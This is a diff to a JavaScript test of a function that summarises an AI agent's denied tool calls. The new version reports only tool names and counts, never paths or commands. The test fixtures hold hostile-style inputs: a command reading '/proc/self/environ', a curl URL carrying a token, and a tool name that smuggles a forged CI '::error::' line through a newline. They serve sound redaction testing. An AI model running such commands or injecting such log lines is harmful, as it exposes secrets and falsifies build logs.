@@ -555,8 +555,10 @@ test("agent denial summary shows tool and path, never content", () => {
   const out = denialSummary(JSON.stringify({ subtype: "success", permission_denials: [
     { tool_name: "Write", tool_input: { file_path: "/w/.agent-out/ideas.json", content: "SECRET-CONTENT" } },
     { tool_name: "Bash", tool_input: { command: "curl https://x?t=abc" } },
+    { tool_name: "Bash", tool_input: { command: "cat /proc/self/environ" } },
+    { tool_name: "Evil\n::error::forged", tool_input: {} },
   ] }));
-  assert.deepEqual(out, ["denied: Write /w/.agent-out/ideas.json", "denied: Bash curl"]);
+  assert.deepEqual(out, ["denied: Write ×1", "denied: Bash ×2", "denied: (other tool) ×1"], "names and counts only: no agent-chosen path or command reaches the public log");
   assert.match(denialSummary("not json")[0], /no result/);
 });
 
